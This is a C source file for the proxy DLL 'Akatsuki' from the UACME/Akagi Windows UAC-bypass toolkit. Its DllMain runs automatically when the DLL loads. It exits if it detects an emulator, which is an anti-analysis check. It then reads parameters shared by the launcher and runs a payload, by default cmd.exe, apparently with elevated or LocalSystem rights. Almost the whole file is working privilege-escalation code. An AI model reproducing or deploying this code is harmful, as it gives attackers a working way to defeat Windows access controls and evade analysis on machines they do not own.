/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.17
*
*  DATE:        20 Mar 2019
*
*  Proxy dll entry point, Akatsuki.
*  Special dll for wow64 logger method.
*  Akatsuki must be special, isn't it?
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

#include "shared\shared.h"
#include "shared\libinc.h"

#define LoadedMsg      TEXT("Akatsuki lock and loaded")

HANDLE g_SyncMutant = NULL;

UACME_PARAM_BLOCK g_SharedParams;


/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{

}

/*
* DbgDumpRuntimeInfo
*
* Purpose:
*
* Dump runtime info to the file, this routine is only for debug builds.
*
*/
VOID DbgDumpRuntimeInfo()
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    WCHAR szReportName[MAX_PATH * 2];
    WCHAR sysdir[MAX_PATH + 1];

    DWORD cch;
    LPWSTR lpText = NULL;

    DWORD bytesIO;
    WCHAR ch;

    cch = ucmExpandEnvironmentStrings(L"%temp%\\", sysdir, MAX_PATH);
    if ((cch != 0) && (cch < MAX_PATH)) {
        _strcpy(szReportName, sysdir);
        _strcat(szReportName, TEXT("report_"));
        ultostr(GetCurrentProcessId(), _strend(szReportName));
        _strcat(szReportName, TEXT(".txt"));

        hFile = CreateFile(szReportName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {

            ch = (WCHAR)0xFEFF;
            WriteFile(hFile, &ch, sizeof(WCHAR), &bytesIO, NULL);

            lpText = ucmQueryRuntimeInfo(TRUE);
            if (lpText) {
                WriteFile(hFile, lpText, (DWORD)(_strlen(lpText) * sizeof(WCHAR)), &bytesIO, NULL);
                ucmDestroyRuntimeInfo(lpText);
            }
            CloseHandle(hFile);
        }
    }
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode;
    PWSTR lpParameter;
    ULONG cbParameter;

    BOOL bIsLocalSystem = FALSE;
    ULONG SessionId;

    if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
        ExitProcess(0);

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        SessionId = g_SharedParams.SessionId;
    }
    else {
        lpParameter = NULL;
        cbParameter = 0UL;
        SessionId = 0;
    }

    ucmIsLocalSystem(&bIsLocalSystem);

    ExitCode = (ucmLaunchPayload2(
        bIsLocalSystem, 
        SessionId, 
        lpParameter, 
        cbParameter) != FALSE);

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    ExitProcess(ExitCode);
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
        ExitProcess('Foff');

    if (fdwReason == DLL_PROCESS_ATTACH) {
        OutputDebugString(LoadedMsg);
        //DbgDumpRuntimeInfo();
        DefaultPayload();
    }
    return TRUE;
}
